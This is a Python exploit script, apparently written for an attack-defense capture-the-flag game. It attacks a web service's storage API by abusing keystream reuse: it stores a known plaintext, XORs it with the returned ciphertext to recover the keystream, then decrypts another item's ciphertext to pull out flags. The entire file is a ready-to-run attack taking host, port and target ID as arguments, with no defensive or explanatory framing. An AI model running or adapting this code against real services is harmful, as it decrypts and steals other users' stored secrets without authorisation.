import re
import sys

import requests

FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
TIMEOUT = 5


def exploit(host, port, flag_id):
    base = "http://{}:{}".format(host, port)
    flags = []

    # 1) Store a long known plaintext of our own and read back its ciphertext.
    known = "A" * 256
    r = requests.post(base + "/api/store",
                      json={"owner": "attacker", "secret": known}, timeout=TIMEOUT)
    known_id = r.json()["id"]
    r = requests.get(base + "/api/item/{}".format(known_id), timeout=TIMEOUT)
    ct_known = bytes.fromhex(r.json()["ciphertext"])

    # 2) Recover the keystream: KS = P XOR C.
    ks = bytes(a ^ b for a, b in zip(known.encode(), ct_known))

    # 3) Grab the target ciphertext and XOR it with the same keystream.
    r = requests.get(base + "/api/item/{}".format(flag_id), timeout=TIMEOUT)
    ct_flag = bytes.fromhex(r.json()["ciphertext"])
    pt = bytes(a ^ b for a, b in zip(ct_flag, ks)).decode(errors="ignore")

    m = FLAG_RE.search(pt)
    if m:
        flags.append(m.group(0))
    return flags


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("usage: python sploit.py <host> <port> <flag_id>")
        sys.exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    flag_id = sys.argv[3]
    for f in exploit(host, port, flag_id):
        print(f)
